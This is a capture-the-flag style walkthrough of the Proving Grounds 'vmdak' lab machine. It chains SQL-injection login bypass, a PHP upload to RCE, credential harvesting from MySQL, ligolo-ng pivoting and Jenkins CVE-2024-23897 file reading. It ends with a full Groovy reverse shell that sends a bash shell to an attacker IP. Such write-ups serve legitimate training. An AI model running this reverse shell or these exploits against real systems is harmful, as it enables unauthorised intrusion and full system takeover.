---
layout: post
title: "vmdak - Proving Grounds Practice"
summary: "FTP Anonymous to obtain config.xml → Prison Management System 1.0 → CVE-2024-3438 SQL Injection Login Bypass → CVE-2024-48594 File Upload Bypass to RCE → MySQL Database Enumeration to find user password → 8080 port open on 127.0.0.1 → ligolo-ng 240.0.0.1/4 to reach 127.0.0.1 Jenkins → jenkins 2.401.2 → CVE-2024-23897 Jenkins LFI → jenkins /script groovy script reverse shell → root"
---

# vmdak - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed FTP, SSH, HTTP and non-common HTTPs (9443) ports were open.

<img width="1190" height="708" alt="00 - nmap" src="https://github.com/user-attachments/assets/69bf408f-8cb7-4d23-9328-91a642667bf0" />

### FTP Anonymous
FTP anonymous login was allowed and there was a file named `config.xml` which was `jenkins` config file. It showed jenkins version and admin password file location.

<img width="1547" height="416" alt="01 - ftp anon config xml" src="https://github.com/user-attachments/assets/2776f28e-5105-4f91-89d6-ea39eefb2c11" />

### Web Enumeration
The HTTPs website was `Prison Management System` site.

<img width="1283" height="591" alt="02 - prison management system" src="https://github.com/user-attachments/assets/b01a0cd9-7a97-4773-98e9-54c7c0b92a7e" />

## Exploit
### CVE-2024-3438 (SQLi Login Bypass)
A vulnerability was found in SourceCodester Prison Management System 1.0 and classified as critical. This issue affects some unknown processing of the file /Admin/login.php. The manipulation leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-259691.

I found a CVE for bypassing admin login on Prison Management System Website.

<img width="1287" height="584" alt="03 - sqli" src="https://github.com/user-attachments/assets/e95a3e8f-f5f3-4269-b0a1-c4df429205d6" />

And I was able to login.

<img width="1287" height="760" alt="04 - logged in" src="https://github.com/user-attachments/assets/b209d0a9-bae1-4af4-bc18-7aab9c69fec6" />

### CVE-2024-48594 (RCE)
File Upload vulnerability in Prison Management System v.1.0 allows a remote attacker to execute arbitrary code via the file upload component.

I found a repository ([https://github.com/fubxx/CVE/blob/main/PrisonManagementSystemRCE.md](https://github.com/fubxx/CVE/blob/main/PrisonManagementSystemRCE.md)) which explains how to exploit file upload to obtain remote code execution.

At first I caught a profile photo editing request and changed it to a PHP file.

<img width="1886" height="646" alt="06 - revshell" src="https://github.com/user-attachments/assets/92b2578c-31d9-4f07-90bd-8ce5795806b2" />

Then I visited `/uploadImage/rev.php` endpoint and obtained reverse shell.

<img width="1056" height="300" alt="07 - revshell" src="https://github.com/user-attachments/assets/24ba3edf-bca2-493c-8755-a706b939be40" />

### Database MySQL Enumeration
Later, I found a directory called database under prison management system. Inside it I found a config file which revealed mysql root password.

<img width="1106" height="418" alt="08 - sql creds" src="https://github.com/user-attachments/assets/e14f3e64-42b1-45de-a7bd-f1ed13c9a1fd" />

Then, I logged in to root and started enumerating mysql database. I found an entry that shows user password.

<img width="961" height="113" alt="09 - table" src="https://github.com/user-attachments/assets/4bfa99e2-4a67-4682-8c70-1022471e9ab5" />

I tried it and obtained user flag.

<img width="722" height="454" alt="10 - local flag" src="https://github.com/user-attachments/assets/3b5cd0df-632e-4409-845b-a037f1b70d30" />

## Privilege Escalation
### Local Port Forwarding to Reach Jenkins
I remembered the config file we found. So at first I executed `netstat -ano | grep -i listen` and found out port 8080 was only reachable for 127.0.0.1 (localhost).

<img width="845" height="167" alt="11 - local port 8080" src="https://github.com/user-attachments/assets/0130248c-3fd6-45c2-b4df-ccb601fc692d" />

### ligolo-ng
So I setup an ligolo-ng agent and ligolo-ng proxy and added route for `240.0.0.0/4` which is a special subnet for localhost.

<img width="687" height="77" alt="12 - agent" src="https://github.com/user-attachments/assets/79d65bd8-4f70-4ffa-ad22-ad234373cc69" />

<img width="1139" height="515" alt="13 - proxy" src="https://github.com/user-attachments/assets/146109ff-e927-46d3-93ac-bd7ca5d817c9" />

### CVE-2024-23897 (Jenkins LFI)
Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable a feature of its CLI command parser that replaces an '@' character followed by a file path in an argument with the file's contents, allowing unauthenticated attackers to read arbitrary files on the Jenkins controller file system.

Then I visited the jenkins and it prompted me with admin password.

<img width="1105" height="740" alt="14 - admin password" src="https://github.com/user-attachments/assets/794abb35-033c-4845-8b71-30d3f122e9f1" />

So, at first I searched jenkins version and found out it was vulnerable to Local File Inclusion. And I found an exploit code for it ([https://www.exploit-db.com/exploits/51993](https://www.exploit-db.com/exploits/51993)). I simply executed it and read the administrator password.

<img width="427" height="110" alt="15 - admin passwrd" src="https://github.com/user-attachments/assets/36bc9846-2ff8-4dc6-bc0c-c133502312b7" />

And it started jenkins installation.

<img width="1293" height="832" alt="16 - installing" src="https://github.com/user-attachments/assets/a8c1070a-4461-4b4a-82a4-fb7f693b6d33" />

### Jenkins /script tab
Later, I visited /script tab and simply wrote groovy reverse shell to obtain root shell.
```java
String host="192.168.45.245";
int port=8443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

<img width="1280" height="813" alt="17 - groovy" src="https://github.com/user-attachments/assets/c117894d-6f17-4f85-acf0-b93211bf4fc9" />

After clicking Run button, I obtained root shell.

<img width="573" height="196" alt="18 - root" src="https://github.com/user-attachments/assets/9e544b1e-0e45-4ae7-a559-15ff578a6e3a" />
